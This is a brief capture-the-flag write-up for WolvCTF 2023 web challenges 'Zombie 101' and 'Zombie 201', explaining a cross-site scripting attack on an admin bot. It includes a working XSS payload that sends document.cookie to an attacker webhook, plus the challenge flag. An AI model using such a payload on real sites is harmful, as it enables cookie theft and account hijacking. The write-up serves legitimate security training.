item.title: WolvCTF 2023 - Writeup
item.description: Challenges Solved : Web ZOmbie 101 This Challenge is a a classic xss where you steal the cookie’s admin. (admin is a bot who visits the url you give). Payload : <script>window.location="https://<myWebHook>/?c=".concat(document.cookie)</script> I sent the url with payload to the admin input and got the flag : wctf{c14551c-4dm1n-807-ch41-n1c3-j08-93261} Zombie 201 It is the same webapp than Zombie 101, but admin activated the httponly parameter. We can’t gather the cookie throught the document object.
